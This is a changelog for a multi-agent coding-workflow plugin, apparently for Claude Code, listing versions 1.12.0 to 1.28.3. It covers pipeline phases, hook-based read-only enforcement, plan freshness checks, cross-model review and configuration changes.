Fix: Arc implicit delegation gaps — explicit Phase 0 step contracts for delegated commands.

### Added

- New reference: `arc-delegation-checklist.md` — canonical RUN/SKIP/ADAPT delegation contract for all arc phases
- Codex Oracle as optional 4th plan reviewer in arc Phase 2 (`arc-phase-plan-review.md`)
- Delegation Steps sections in `arc-phase-code-review.md` (Phase 6) and `arc-phase-audit.md` (Phase 8)
- Bidirectional `DELEGATION-CONTRACT` comments in `review.md` and `audit.md` Phase 0

### Changed

- plugin.json: version 1.28.2 → 1.28.3
- marketplace.json: version 1.28.2 → 1.28.3
- CLAUDE.md: Added `arc-delegation-checklist.md` to References section

## [1.28.2] - 2026-02-16

Refactor: Arc Phase 1 (FORGE) now delegates to `/rune:forge` for full Forge Gaze support.

### Changed

Note: v1.18.2 introduced initial forge delegation. v1.27.1 (ATE-1) restructured
arc phases, requiring this re-implementation of the delegation pattern.

- Arc Phase 1 now delegates to `/rune:forge` instead of inline agent logic
- forge.md gains `isArcContext` detection (skips interactive phases in arc context)
- forge.md emits state file for arc team name discovery
- arc-phase-forge.md rewritten from inline (153 lines) to delegation wrapper (~50 lines)

## [1.28.1] - 2026-02-16

Refactor: Extract Issue Creation from plan.md to reference file.

### Changed

- Move inline Issue Creation section (34 lines) from plan.md to `references/issue-creation.md`
- plan.md reduced from 571 to 542 lines
- plugin.json: version 1.28.0 → 1.28.1
- marketplace.json: version 1.28.0 → 1.28.1

## [1.28.0] - 2026-02-16

Feature: Arc Dispatcher Extraction — extract 7 phases from arc.md into self-contained reference files.

### Changed

- Extract per-phase logic from arc.md (977→577 lines, -41%) into `references/arc-phase-*.md` files
- New reference files: arc-phase-forge.md, arc-phase-plan-review.md, arc-phase-plan-refine.md, arc-phase-work.md, arc-phase-code-review.md, arc-phase-mend.md, arc-phase-audit.md
- Transform arc.md into lightweight dispatcher skeleton that loads phase logic via Read()
- Phases 2.7, 5.5, 7.5 already used reference files — unchanged
- plugin.json: version 1.27.1 → 1.28.0
- marketplace.json: version 1.27.1 → 1.28.0

## [1.27.1] - 2026-02-16

Feature: ATE-1 Agent Teams Enforcement — prevent context explosion in arc pipeline.

### Added

- **ATE-1 enforcement** — Three-layer defense against bare Task calls in arc pipeline:
  1. ATE-1 enforcement section at top of arc.md with explicit pattern + anti-patterns
  2. Phase 1 FORGE inlined with full TeamCreate + Task + Monitor + Cleanup example
  3. `enforce-teams.sh` PreToolUse hook blocks bare Task calls during active workflows

### Changed

- Freshness gate extracted from arc.md to `references/freshness-gate.md`
- Review agent checklists extracted to reference files (forge-keeper, tide-watcher, wraith-finder)
- `enforce-readonly.sh` SEC-001 hook for review/audit write protection
- Hook infrastructure expanded from 2 to 4 hooks in CLAUDE.md
- plugin.json: version 1.27.0 → 1.27.1
- marketplace.json: version 1.27.0 → 1.27.1

## [1.27.0] - 2026-02-16

Quality & security bundle: PreToolUse read-only enforcement, TaskCompleted semantic validation, and agent prompt extraction to reference files.

### Added

- **QW-B: PreToolUse read-only hook (SEC-001)** — Platform-level enforcement preventing review/audit Ashes from using Write, Edit, Bash, or NotebookEdit tools. Uses dual-condition detection: marker file (`.readonly-active` in signal directory) + transcript path check (`/subagents/`). Overcomes PreToolUse hook's lack of `team_name` field.
- **QW-C: TaskCompleted prompt hook** — Haiku-model semantic validation gate alongside existing signal-file command hook. Rejects clearly premature task completions (empty subjects, generic descriptions) while allowing legitimate completions. Higher standard for `rune-*` / `arc-*` team tasks.
- **`scripts/enforce-readonly.sh`** — SEC-001 enforcement script with `jq` dependency guard, graceful degradation, and JSON-structured deny response
- **`agents/review/references/async-patterns.md`** — Multi-language async/concurrency code examples extracted from tide-watcher (Python, Rust, TypeScript, Go)
- **`agents/review/references/dead-code-patterns.md`** — Dead code detection patterns extracted from wraith-finder (classical detection, DI wiring, router registration, event handlers)
- **`agents/review/references/data-integrity-patterns.md`** — Migration safety patterns extracted from forge-keeper (reversibility, lock analysis, transformations, transactions, privacy)

### Changed

- **QW-D: Agent prompt extraction** — 3 oversized review agents reduced to reference-linked prompts:
  - `tide-watcher.md`: 708 → ~165 lines (extracted async-patterns.md)
  - `wraith-finder.md`: 563 → ~300 lines (extracted dead-code-patterns.md)
  - `forge-keeper.md`: 460 → ~186 lines (extracted data-integrity-patterns.md)
- `hooks/hooks.json`: Added PreToolUse hook for SEC-001 + prompt hook for TaskCompleted; updated description
- `roundtable-circle/SKILL.md`: Phase 2 now writes `.readonly-active` marker before TeamCreate
- `roundtable-circle/references/monitor-utility.md`: Added readonly marker pseudocode
- plugin.json: version 1.26.0 → 1.27.0
- marketplace.json: version 1.26.0 → 1.27.0

### Security

- **SEC-001 mitigation** — Review/audit Ashes previously relied on prompt-level `allowed-tools` restrictions which are NOT enforced when agents are spawned as `general-purpose` subagent_type (the composite Ash pattern). The PreToolUse hook now provides platform-level enforcement that cannot be bypassed by prompt injection.

### Migration Notes

- **No breaking changes** — all additions are purely additive
- PreToolUse hook requires `jq` (same prerequisite as existing hooks); gracefully exits 0 if unavailable
- Readonly marker is scoped to `rune-review-*` / `arc-review-*` / `rune-audit-*` / `arc-audit-*` signal directories
- Agent prompt extraction preserves all analysis frameworks and output formats; only code examples moved to reference files

## [1.26.0] - 2026-02-16

Feature release: Plan Freshness Gate — structural drift detection prevents stale plan execution.

### Added

- **Plan Freshness Gate** — zero-LLM-cost pre-flight check in `/rune:arc` detects when a plan's source codebase has drifted since plan creation. Composite Structural Diff Score (5 weighted signals: commit distance, file drift, identifier loss, branch divergence, time decay) produces a freshness score (0.0–1.0). PASS/WARN/STALE thresholds with user override
- **Enhanced Verification Gate** — check #8 re-checks file drift on forge-expanded references post-enrichment
- **Plan metadata** — `/rune:devise` now writes `git_sha` and `branch` to plan YAML frontmatter for freshness tracking
- **`--skip-freshness` flag** — bypass freshness check for `/rune:arc` when plan is intentionally ahead of codebase
- **`plan.freshness` talisman config** — configurable thresholds (`warn_threshold`, `block_threshold`, `max_commit_distance`, `enabled`)
- **SAFE_SHA_PATTERN** — new security pattern for git SHA validation in `security-patterns.md`
- **Checkpoint schema v5** — adds `freshness` field and `skip_freshness` flag with v4→v5 auto-migration

### Changed

- plugin.json: version 1.25.1 → 1.26.0
- marketplace.json: version 1.25.1 → 1.26.0
- verification-gate.md: 7 checks + report → 8 checks + report (added freshness re-check)
- arc.md: 3 flags → 4 flags (added `--skip-freshness`)

## [1.25.0] - 2026-02-16

Feature release: Agent Intelligence Quick Wins — four interconnected intelligence improvements forming a feedback loop.

### Added

- **QW-1: Smart Code Skimming** (research agents) — Agents choose read depth based on task relevance: deep-read when known-relevant, skim when uncertain, skip when irrelevant. ~60-90% token reduction in file discovery.
- **QW-2: Confidence Scoring** (review + work agents) — All agents include confidence (0-100) with justification. Decision gates: >=80 actionable, 50-79 needs-verify, <50 escalate. Cross-check: confidence >=80 requires evidence ratio >=50%.
- **QW-3: Adaptive Context Checkpoint** (work agents) — Post-task reset scales with task position: Light (1-2), Medium (3-4), Aggressive (5+). Context rot detection triggers immediate aggressive reset.
- **QW-4: Smart DC-1 Recovery** (damage-control) — Severity-based adaptive retry (mild/moderate/severe). Early warning signals at task 4+, 20+ files, low confidence. Respawn protocol with enriched handoff summary.

**Feedback loop**: Skimming → confidence → checkpoint → overflow prevention. Each QW produces signals the next consumes.

### Changed

- Updated 24 files (~182 lines), all prompt-only markdown edits. No code changes, no new files.
- plugin.json: version 1.24.2 → 1.25.0

## [1.24.1] - 2026-02-16

Patch release: Mend fixes from Phase 6 code review — sanitizer hardening, dimension alignment, configuration cleanup.

### Fixed

- Defined `sanitize()` function inline in solution-arena.md (was referenced but undefined)
- Aligned dimension names across all files to: feasibility, complexity, risk, maintainability, performance, innovation
- Fixed `const` to `let` for reassignable weight variables in weight normalization
- Removed duplicate `solution_arena` config block from configuration-guide.md
- Simplified talisman.example.yml to only expose `enabled` and `skip_for_types`
- Removed premature `arena_agents` field from inscription-schema.md

### Changed

- plugin.json: version 1.24.0 → 1.24.1
- marketplace.json: version 1.24.0 → 1.24.1

## [1.24.0] - 2026-02-16

Feature release: Solution Arena — competitive evaluation of alternative approaches before committing to a plan. Phase 1.8 generates 2-5 solutions, challenges them via Devil's Advocate and Innovation Scout agents, scores across 6 weighted dimensions, and selects a champion approach with full rationale.

### Added

- **Phase 1.8: Solution Arena** — competitive evaluation of 2-5 alternative approaches before committing to a plan
- **Devil's Advocate and Innovation Scout** challenger agents for adversarial plan evaluation
- **Weighted decision matrix** (6 dimensions: feasibility, complexity, risk, maintainability, performance, innovation) with convergence detection
- **Mandatory elicitation method selection** (Step 3.5 no longer optional — minimum 1 method required)
- `--no-arena` flag for granular Arena skip control
- **Champion Solution and Challenger Report** output formats
- `solution_arena` talisman.yml configuration section (enabled, weights, thresholds, skip_for_types)

### Changed

- Elicitation Step 3.5 now mandatory (minimum 1 method required)
- `--quick` mode auto-selects top-scored elicitation method
- Standard template includes condensed "Solution Selection" section after "Proposed Solution"
- Comprehensive template replaces passive "Alternative Approaches" with active Arena evaluation matrix
- methods.csv: Tree of Thoughts, Comparative Analysis Matrix, Pre-mortem Analysis, and Architecture Decision Records now include `plan:1.8` phase
- phase-mapping.md: Added Plan Phase 1.8 section with 4 auto-suggested Tier 1 methods
- plugin.json: version 1.23.0 → 1.24.0
- marketplace.json: version 1.23.0 → 1.24.0

## [1.23.0] - 2026-02-15

Feature release: Phase 2 BRIDGE — event-driven agent synchronization via Claude Code hooks. Replaces 30-second `TaskList()` polling with filesystem signal files written by `TaskCompleted` and `TeammateIdle` hooks. Average task-completion detection latency drops from ~15 seconds to ~2.5 seconds with near-zero token cost. Automatic fallback to Phase 1 polling when hooks or `jq` are unavailable.

### Added

- **Event-driven synchronization** — `TaskCompleted` hook writes signal files (`tmp/.rune-signals/{team}/{task_id}.done`) on task completion; monitor utility detects signals via 5-second filesystem checks instead of 30-second API polling
- **Quality gate enforcement** — `TeammateIdle` hook validates teammate output files exist and are non-empty before allowing idle; checks for SEAL markers on review/audit workflows (hard gate — blocks idle until output passes)
- **Hook scripts**: `scripts/on-task-completed.sh` (signal file writer with atomic temp+mv, `.all-done` sentinel when all expected tasks complete) and `scripts/on-teammate-idle.sh` (output file quality gate with inscription-based expected output lookup)
- **Hook configuration**: `hooks/hooks.json` registers both hooks with `${CLAUDE_PLUGIN_ROOT}` path resolution and appropriate timeouts (10s for TaskCompleted, 15s for TeammateIdle)
- **Dual-path monitoring** in `monitor-utility.md` — signal-driven fast path (5s filesystem check, near-zero token cost) with automatic fallback to Phase 1 polling (30s `TaskList()` calls) when signal directory is absent
- **Signal directory lifecycle** (`tmp/.rune-signals/{team}/`) — created by orchestrator before spawning Ashes (with `.expected` count file and `inscription.json`), cleaned up in workflow Phase 7 and `/rune:rest`

### Changed

- plugin.json: version 1.22.0 → 1.23.0
- marketplace.json: version 1.22.0 → 1.23.0
- CLAUDE.md: Added Hook Infrastructure section documenting TaskCompleted and TeammateIdle hooks

### Prerequisites

- **`jq` required** for hook scripts — used for safe JSON parsing and construction. If `jq` is not installed, hook scripts exit 0 with a stderr warning and the monitor falls back to Phase 1 polling automatically. Install: `brew install jq` (macOS) or `apt-get install jq` (Debian/Ubuntu).

### Migration Notes

- **No breaking changes** — Phase 2 is purely additive. Existing workflows continue to work unchanged via automatic polling fallback.
- Signal directories are scoped per team name (`rune-*` prefix guard) and do not interfere with non-Rune tasks.
- Hook scripts validate input defensively: non-Rune tasks, missing signal directories, and parse failures all exit 0 silently.
- Rollback: delete `hooks/hooks.json` and remove signal directory setup from commands. The shared monitor automatically falls back to polling when signal directory is absent.

## [1.22.0] - 2026-02-15

Feature release: Nelson-inspired anti-pattern library, damage control procedures, risk-tiered task classification, file ownership model, and structured checkpoint reporting. Based on cross-plugin analysis of Nelson's Royal Navy orchestration patterns adapted to Rune's Elden Ring lore.

### Added

- **Standing Orders** (`standing-orders.md`) — 6 named anti-patterns with observable symptoms, decision tables, remedy procedures, and cross-references: SO-1 Hollow Ash (over-delegation), SO-2 Shattered Rune (file conflicts), SO-3 Tarnished Smith (lead implementing), SO-4 Blind Gaze (skipping classification), SO-5 Ember Overload (context overflow), SO-6 Silent Seal (malformed output)
- **Damage Control** (`damage-control.md`) — 6 recovery procedures with ASSESS/CONTAIN/RECOVER/VERIFY/REPORT format and double-failure escalation: DC-1 Glyph Flood (context overflow), DC-2 Broken Ward (quality failure), DC-3 Fading Ash (agent timeout), DC-4 Phantom Team (lifecycle failure), DC-5 Crossed Runes (concurrent workflows), DC-6 Lost Grace (session loss)
- **Risk Tiers** (`risk-tiers.md`) — 4-tier deterministic classification (Tier 0 Grace, Tier 1 Ember, Tier 2 Rune, Tier 3 Elden) with 4-question decision tree, file-path fallback heuristic, graduated verification matrix, failure-mode checklist for Tier 2+, and TaskCreate metadata format
- **File Ownership** in `/rune:strive` — EXTRACT/DETECT/RESOLVE/DECLARE algorithm for preventing concurrent file edits. Ownership encoded in task descriptions (persists across auto-release reclaim). Directory-level by default, exact-file overrides when specific.
- **Checkpoint Reporting** in `monitor-utility.md` — `onCheckpoint` callback with milestone-based template (25%, 50%, 75% + blocker detection). Displays progress, active tasks, blockers, and decision recommendation.
- work.md: Phase 1 risk tier classification via 4-question decision tree (parse-plan.md)
- work.md: Phase 1 file target extraction from task descriptions (parse-plan.md)
- work.md: Phase 1 file ownership conflict detection with automatic serialization via `blockedBy`
- work.md: TaskCreate now includes `risk_tier`, `tier_name`, `file_targets` metadata and ownership in description
- worker-prompts.md: Step 4.5 File Ownership section in rune-smith and trial-forger prompts
- worker-prompts.md: Step 4.6 Risk Tier Verification with per-tier requirements

### Changed

- plugin.json: version 1.21.1 → 1.22.0
- marketplace.json: version 1.21.1 → 1.22.0
- work.md: Error handling table updated — file conflicts now resolved via ownership serialization
- work.md: Common pitfalls table updated — workers editing same files prevented by Phase 1 step 5.1

## [1.21.1] - 2026-02-15

### Security

- **fix(security)**: Eliminate `$()` command substitution in talisman `verification_patterns` interpolation. All consumer sites now use `safeRgMatch()` (`rg -f`) instead of double-quoted Bash interpolation. Affects ward-check.md, verification-gate.md, and plan-review.md pseudocode. Added `safeRgMatch()` helper to security-patterns.md. Updated SAFE_REGEX_PATTERN threat model from "Accepted Risk" to "Mitigated".

## [1.21.0] - 2026-02-15

### Changed

- Dynamic team lifecycle cleanup refactor — pre-create guards, dynamic member discovery, validated rm -rf

## [1.20.0] - 2026-02-15

### Changed

- Consolidated agent frontmatter + security hardening across commands
- Fix 13 TOME findings + structural refactor into references
- Extract shared monitor utility from 7 commands
- Fix 6 TOME findings from monitor-utility code review

## [1.19.0] - 2026-02-15

Feature release: 5 structural recommendations from cross-cycle meta-analysis of 224 findings across 8 review cycles. Addresses recurring systemic issues in the plugin's documentation-as-specification architecture.

### Added

- **R1: security-patterns.md** — Canonical reference file for all security validation patterns (SAFE_*, CODEX_*, FORBIDDEN_KEYS, BRANCH_RE). Located at `plugins/rune/skills/roundtable-circle/references/security-patterns.md`. Each pattern has regex value, threat model, ReDoS assessment, consumer file list, and machine-parseable markers. Sync comments added to all 4 consumer command files (plan.md, work.md, arc.md, mend.md).
- **R1: Arc Phase 2.7 enforcement** — Verification gate check for undocumented inline SAFE_*/ALLOWLIST declarations missing security-patterns.md references.
- **R2: Documentation Impact** — New section in Standard plan template (between Dependencies & Risks and Cross-File Consistency) with structured checklist for version bumps, CHANGELOG, and registry updates. Comprehensive template merges with existing Documentation Plan.
- **R2: Reviewer integration** — decree-arbiter and knowledge-keeper agents now evaluate Documentation Impact completeness during Phase 4C plan review.
- **R3: Phase 4.3 Doc-Consistency** — Orchestrator-only non-blocking sub-phase in work.md between Phase 4 (ward check) and Phase 4.5 (Codex Advisory). Detects version/count drift using talisman-based extractors. Talisman fallback chain: `work.consistency.checks` → `arc.consistency.checks` → defaults.
- **R4: STEP 4.7 Plan Section Coverage** — Enhancement to arc.md Phase 5.5 (GAP ANALYSIS) that cross-references plan H2/H3 headings against committed code. Reports ADDRESSED/MISSING/CLAIMED status in gap-analysis.md.
- **R5: Phase 5.5 Cross-File Mend** — Orchestrator-only cross-file resolution for SKIPPED findings with "cross-file dependency" reason. Caps at 5 findings, 5 files per finding. Atomic rollback via edit log on partial failure.
- **R5: Phase 5.6 Second Ward Check** — Validates cross-file fixes with conservative revert-all on ward failure.
- **R5: FIXED_CROSS_FILE status** — New resolution status in mend resolution reports.
- talisman.example.yml: `work.consistency.checks` schema documentation

### Changed

- decree-arbiter now evaluates 9 dimensions (was 6): architecture fit, feasibility, security/performance risks, dependency impact, pattern alignment, internal consistency, design anti-pattern risk, consistency convention, documentation impact
- mend.md: MEND-3 (Doc-Consistency) renumbered to Phase 5.7
- mend.md: Fixer prompt updated to report `needs: [file1, file2]` format for cross-file dependencies
- mend.md: Phase overview diagram updated with new phases (5.5, 5.6, 5.7)
- mend.md: Resolution report template includes `Fixed (cross-file)` count

## [1.18.2] - 2026-02-15

Bug fix: Arc Phase 1 (FORGE) now delegates to `/rune:forge` logic instead of using a hardcoded inline implementation. This restores Forge Gaze topic matching, Codex Oracle, custom Ashes, and section-level enrichment to the arc pipeline.

### Fixed

- arc.md: Phase 1 (FORGE) refactored from inline 5-agent implementation to delegation to `/rune:forge` logic, consistent with Phase 5/6/8 delegation pattern
- arc.md: Phase 1 now includes Forge Gaze topic-to-agent matching (section-level enrichment instead of bulk research)
- arc.md: Phase 1 now includes Codex Oracle when `codex` CLI is available (was missing since v1.18.0)
- arc.md: Phase 1 now includes custom Ashes from talisman.yml with `workflows: [forge]`

### Changed

- forge.md: Added arc context detection (`planPath.startsWith("tmp/arc/")`) to skip interactive phases (scope confirmation, post-enhancement options) when invoked by `/rune:arc`
- arc.md: Per-Phase Tool Restrictions table updated for Phase 1 delegation

## [1.18.0] - 2026-02-14

Feature release: Codex Oracle — cross-model verification Ash using OpenAI's Codex CLI (GPT-5.3-codex). Auto-detected when `codex` CLI is installed, providing a second AI perspective across review, audit, plan, forge, and work pipelines.

### Added

- plan.md: Phase 1C Codex Oracle research agent — conditional third external research agent alongside practice-seeker and lore-scholar, with HALLUCINATION GUARD and `[UNVERIFIED]` marking for unverifiable claims
- plan.md: Phase 4.5 (Plan Review) Codex plan reviewer (formerly Phase 4C) — optional plan review with `[CDX-PLAN-NNN]` finding format, parallel with decree-arbiter and knowledge-keeper
- plan.md: Cross-model research dimension in Standard/Comprehensive template References section
- plan.md: Updated research scope preview and pipeline overview to show Codex Oracle conditionals
- work.md: Phase 4.5 Codex Advisory — non-blocking, plan-aware implementation review after Post-Ward Verification Checklist. Compares diff against plan for requirement coverage gaps. `[CDX-WORK-NNN]` warnings at INFO level.
- work.md: Codex advisory reference in PR body template
- forge.md: Codex Oracle in Forge Gaze topic registry — cross-model enrichment with threshold_override 0.25, topics: security, performance, api, architecture, testing, quality
- CLAUDE.md: Codex Oracle added to Ash table (6th built-in Ash) with inline perspectives via codex exec
- README.md: Codex Oracle feature section with How It Works, Cross-Model Verification, Prerequisites, and Configuration
- README.md: Optional codex CLI in Requirements section

### Changed

- plugin.json: version 1.17.0 → 1.18.0
- CLAUDE.md: "5 built-in Ashes" → "6 built-in Ashes" in review and audit command descriptions
- CLAUDE.md: max_ashes comment updated from "5 built-in + custom" to "6 built-in + custom"
- CLAUDE.md: dedup_hierarchy updated to include CDX prefix: `[SEC, BACK, DOC, QUAL, FRONT, CDX]`
- README.md: Ash table expanded with Codex Oracle row
- README.md: max_ashes comment updated from "5 built-in + custom" to "6 built-in + custom"

### Configuration

New `codex` top-level key in talisman.yml:

```yaml
codex:
  disabled: false
  model: "gpt-5.3-codex"
  reasoning: "high"
  sandbox: "read-only"
  context_budget: 20
  confidence_threshold: 80
  workflows: [review, audit, plan, forge, work]
  work_advisory:
    enabled: true
    max_diff_size: 15000
  verification:
    enabled: true
    fuzzy_match_threshold: 0.7
    cross_model_bonus: 0.15
```

### Migration Notes

- **No breaking changes** — Codex Oracle is purely additive, auto-detected when CLI available
- Existing workflows unaffected when `codex` CLI is not installed (silent skip)
- Disable via `codex.disabled: true` in talisman.yml as runtime kill switch
- Codex Oracle counts toward max_ashes cap (6 built-in + 2 custom = 8 default cap)

## [1.17.0] - 2026-02-14

Feature release: Doc-consistency ward with cross-file drift prevention for arc and mend pipelines.

### Added

- arc.md: Phase 5.5 doc-consistency sub-step — detects drift between source-of-truth files and their downstream targets using declarative `arc.consistency.checks` schema in talisman.yml
- arc.md: DEFAULT_CONSISTENCY_CHECKS fallbacks — version_sync (plugin.json ↔ README/CLAUDE.md) and agent_count (agents/review/*.md ↔ CLAUDE.md)
- arc.md: 4 extractors — `json_field` (JSON dot-path), `regex_capture` (regex group), `glob_count` (file count), `line_count` (line count)
- arc.md: Safety validators — `SAFE_REGEX_PATTERN_CC`, `SAFE_PATH_PATTERN_CC`, `SAFE_DOT_PATH` for consistency check inputs
- mend.md: MEND-3 doc-consistency pass — runs after ward check passes, applies topological sort for cross-file dependencies, Edit-based auto-fixes
- mend.md: DAG cycle detection (DFS-based) for consistency check dependency graphs
- mend.md: Prototype pollution guard for JSON field extraction (`__proto__`, `constructor`, `prototype` blocked)
- plan.md: Cross-File Consistency section in Standard/Comprehensive plan templates
- plan.md: Phase-aware `verification_patterns` with configurable `phase` field
- talisman.example.yml: `arc.consistency.checks` schema with 3 examples (version_sync, agent_count, method_count)

### Changed

- plugin.json: version 1.16.0 → 1.17.0
- marketplace.json: version 1.16.0 → 1.17.0
- README.md: Version updated to 1.17.0

## [1.16.0] - 2026-02-14

Feature release: Elicitation methods integration — 22-method curated registry with phase-aware selection.

### Added

- skills/elicitation/SKILL.md — context-aware method selection skill with CSV registry, tier system, and auto-selection algorithm
- skills/elicitation/methods.csv — 22-method registry (14 Tier 1, 8 Tier 2) covering structured reasoning techniques
- skills/elicitation/references/phase-mapping.md — method-to-phase mapping with workflow integration points
- skills/elicitation/references/examples.md — output templates for each Tier 1 method
- commands/elicit.md — standalone `/rune:elicit` command for manual method invocation
- forge-gaze.md: Elicitation Methods section with Method Budget (MAX_METHODS_PER_SECTION=2)
- ward-sentinel: Red Team/Blue Team analysis structure
- mend-fixer.md: 5 Whys root cause protocol for P1/recurring findings
- scroll-reviewer.md: Self-Consistency and Critical Challenge review dimensions

### Changed

- plan.md: Step 3.5 elicitation offering after brainstorm phase
- plan.md, forge.md, arc.md: Load elicitation skill
- CLAUDE.md: Updated skill table (6 skills), command table (13 commands)
- plugin.json: version 1.15.0 → 1.16.0

## [1.15.0] - 2026-02-14

Feature release: Quality improvements across plan, work, and review pipelines.

### Added

- plan.md Phase 1A: Research scope preview — transparent announcement before agent spawning
- plan.md Phase 4B.5: Verification gate checks e-h — time estimate ban, CommonMark compliance, acceptance criteria measurability, filler phrase detection
- plan.md: Source citation enforcement for research agents (practice-seeker, lore-scholar)
- work.md Phase 0: Previous Shard Context for multi-shard plans
- work.md: Disaster Prevention in worker/tester self-review checklists
- work.md Phase 4: Post-ward checks 7-9 — docstring coverage, import hygiene, code duplication detection
- work.md: Branch name validation and glob metacharacter escaping (security hardening)
- review.md Phase 5: Zero-finding warning for suspiciously empty Ash outputs (>15 files, 0 findings)
- review.md Phase 7: Explicit `/rune:mend` offer with P1/P2 finding counts
- scroll-reviewer.md: Time estimate ban, writing style rules, traceability checks

### Changed

- plugin.json: version 1.14.0 → 1.15.0

## [1.14.0] - 2026-02-13

Patch release: marketplace version synchronization.

### Changed

- marketplace.json: version synced to 1.14.0 (was out of sync with plugin.json)

## [1.13.0] - 2026-02-13

Feature release: 4-part quality improvement for `/rune:arc` pipeline.

**Part 1 — Convergence Gate**: Phase 7.5 (VERIFY MEND) between mend and audit detects regressions introduced by mend fixes, retries mend up to 2x if P1 findings remain, and halts on divergence (whack-a-mole prevention).

**Part 2 — Work/Mend Agent Quality**: Self-review steps, pre-fix context analysis, and expanded verification reduce bugs at source. Root cause: 57% of review findings originated in the work phase, 43% in mend regressions.

**Part 3 — Plan Section Convention**: Requires contract headers (Inputs/Outputs/Preconditions/Error handling) before pseudocode blocks in plans. Root cause: 73% of work-origin bugs traced back to the plan itself — undefined variables, missing error handling, and plan-omitted details. Plans with contracts (v1.11.0) needed only 2 fix rounds; plans without (v1.12.0) needed 5.

**Part 4 — Implementation Gap Analysis**: Phase 5.5 between WORK and CODE REVIEW. Deterministic, orchestrator-only check that cross-references plan acceptance criteria against committed code. Zero LLM cost. Advisory only (warns but never halts). Fills an ecosystem-wide gap — no AI coding agent performs automated plan-to-code compliance checking.

### Added

- arc.md: Phase 7.5 VERIFY MEND — orchestrator-only convergence gate with single Explore subagent spot-check. Parses mend resolution report for modified files, runs targeted regression detection (removed error handling, broken imports, logic inversions, type errors), compares finding counts against TOME baseline.
- arc.md: Convergence decision matrix — CONVERGED (no P1 + findings decreased), RETRY (P1 remaining + rounds left), HALTED (diverging or circuit breaker exhausted). Max 2 retries (3 total mend passes).
- arc.md: Mini-TOME generation for retry rounds — converts SPOT:FINDING markers to RUNE:FINDING format so mend can parse them normally. Findings prefixed `SPOT-R{round}-{NNN}`.
- arc.md: Checkpoint schema v3 with `convergence` object tracking round count, max rounds, and per-round history (findings before/after, P1 count, verdict, timestamp).
- arc.md: Schema v2→v3 migration in `--resume` logic (adds verify_mend as "skipped" + empty convergence object for backward compatibility).
- arc.md: Reduced mend timeout for retry rounds (8 min vs 16 min initial) since retry rounds target fewer findings.
- cancel-arc.md: Added verify_mend to legacyMap (orchestrator-only, no team) and cancellation table.
- plan.md: Plan Section Convention — "Contracts Before Code" subsection with required structure template (Inputs/Outputs/Preconditions/Error handling before pseudocode), 4 rules for pseudocode in plans, good/bad examples.
- arc.md: Phase 2.7 check #6 — contract header verification for pseudocode sections (checks **Inputs**, **Outputs**, **Error handling** headers before code blocks).
- work.md: Worker NOTE about plan pseudocode — implement from contracts, not by copying code verbatim.
- work.md: Self-review step 6.5 for rune-smith prompt — re-read changed files, verify identifiers, function signatures, no dead code.
- work.md: Self-review step 6.5 for trial-forger prompt — check test isolation, imports, assertion specificity.
- work.md: Self-review key principle and 2 additional pitfall rows (copy-paste from plan, mend regressions).
- rune-smith.md: Rule 7 — self-review before completion (re-read files, check identifiers, function signatures).
- rune-smith.md: Rule 8 — plan pseudocode is guidance, not gospel (implement from contracts, verify variables exist).
- mend-fixer.md: Step 2 expanded with pre-fix context analysis (Grep for callers, trace data flow, check identifiers).
- mend-fixer.md: Step 4 expanded with thorough post-fix validation (identifier consistency, function signatures, regex patterns, constants/defaults).
- mend.md: Inline fixer prompt lifecycle expanded to 3-step (PRE-FIX analysis, implement, POST-FIX verification).
- arc.md: Phase 5.5 IMPLEMENTATION GAP ANALYSIS — deterministic, orchestrator-only check that cross-references plan acceptance criteria against committed code. Zero LLM cost. Gap categories: ADDRESSED, MISSING, PARTIAL. Advisory only — warns but never halts.
- arc.md: Checkpoint schema v4 with `gap_analysis` phase entry + v3→v4 migration in `--resume` logic.
- arc.md: Truthbinding ANCHOR/RE-ANCHOR sections added to spot-check Explore subagent prompt (was the only agent prompt without them).
- arc.md: Mini-TOME description sanitization — strips HTML comments, newlines, truncates to 500 chars to prevent marker corruption.
- arc.md: Spot-check finding scope validation — filters to only files in mendModifiedFiles and valid P1/P2/P3 severity.
- arc.md: Empty convergence history guard — prevents array index error on first round.
- arc.md: Checkpoint max_rounds capped against CONVERGENCE_MAX_ROUNDS constant.

### Changed

- arc.md: PHASE_ORDER expanded from 8 to 10 phases (added gap_analysis between work and code_review, verify_mend between mend and audit)
- arc.md: Pipeline Overview diagram updated with Phase 7.5 and convergence loop arrows
- arc.md: Phase Transition Contracts table updated with MEND→VERIFY_MEND and VERIFY_MEND→MEND (retry) handoffs
- arc.md: Completion Report now includes convergence summary with per-round finding trend
- arc.md: Checkpoint initialized with schema_version 4 (was 3)
- arc.md: Spot-check no-output default changed from "converged" to "halted" (fail-closed)
- plan.md: Line 657 "illustrative pseudocode" strengthened with cross-reference to Plan Section Convention
- plan.md: Comprehensive Template's Technical Approach section now references Plan Section Convention
- rune-smith.md: Rule 1 expanded from "Read before write" to "Read the FULL target file" (understand imports, constants, siblings)
- mend-fixer.md: Steps 2 and 4 now require context analysis before fixes and thorough validation after
- CLAUDE.md: Arc Pipeline description updated to mention gap analysis and convergence gate (10 phases)
- CLAUDE.md: Key Concepts updated with Implementation Gap Analysis (Phase 5.5) and Plan Section Convention
- README.md: Arc Mode section updated to 10 phases with GAP ANALYSIS and VERIFY MEND descriptions
- README.md: Key Concepts updated with Plan Section Convention
- team-lifecycle-guard.md: Arc phase table updated (Phases 2.5, 2.7, 5.5, 7.5 are orchestrator-only)
- team-lifecycle-guard.md: Mend team naming pattern corrected from `mend-{timestamp}` to `rune-mend-{id}`
- cancel-arc.md: Added gap_analysis to legacyMap and cancellation table (orchestrator-only)
- rune-smith.md: Step 6 changed from "Commit changes" to "Generate patch for commit broker"
- plan.md: Fixed unquoted shell paths and invalid `result.matchCount` in talisman verification patterns
- All files: "Reserved for v1.13.0" references updated to "Reserved for a future release"
- plugin.json: version 1.12.0 → 1.13.0

### Migration Notes

- **No breaking changes** — existing checkpoints auto-migrate v2→v3→v4 on `--resume`
- The convergence gate is automatic and requires no user configuration
- Gap analysis is advisory only — warns but never halts the pipeline
- Standalone `/rune:mend` and `/rune:appraise` are completely unaffected
- Old checkpoints resumed with new code skip verify_mend and gap_analysis (marked "skipped")

## [1.12.0] - 2026-02-13

Feature release: Ship workflow gaps — adds branch setup, plan clarification, quality verification checklist, PR creation, enhanced completion report, and key principles to `/rune:strive`. Closes the "last mile" from plan → commits → PR in a single invocation.

### Added

- work.md: Phase 0.5 ENVIRONMENT SETUP — branch safety check warns when on default branch, offers feature branch creation with `rune/work-{slug}-{timestamp}` naming (reuses arc COMMIT-1 pattern). Dirty working tree detection with stash offer. Skip detection for arc invocation.
